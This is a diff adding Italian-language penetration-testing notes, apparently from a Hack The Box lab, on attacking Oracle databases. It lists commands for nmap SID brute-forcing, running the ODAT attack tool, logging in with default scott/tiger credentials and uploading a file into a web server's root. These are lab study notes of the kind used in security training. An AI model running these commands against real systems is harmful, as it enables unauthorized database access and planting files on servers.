@@ -807,3 +807,25 @@ TRACE_DIRECTORY	The directory where the trace files are stored.
 TRACE_FILE_NAME	The name of the trace file.
 LOG_FILE	The file where the log information is stored.
 
+## ODAT
+Odat Oracle Database Attacking tool e' un tool per attaccare i DB oracle.
+
+## Footprinting
+
+`j4k1dibe@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open` con nmap.
+
+In Oracle un SID (System Identifier) e' un nome che identifica univocamente un' istanza di database.
+
+`j4k1dibe@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute` brute-force dei SID dei DB.
+
+`j4k1dibe@htb[/htb]$ ./odat.py all -s 10.129.204.235` runna odat con tutte le opzioni.
+
+`j4k1dibe@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE` per connettersi ad un DB.
+
+If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below:
+`j4k1dibe@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`
+
+`j4k1dibe@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt` file upload con odat.
+
+
+
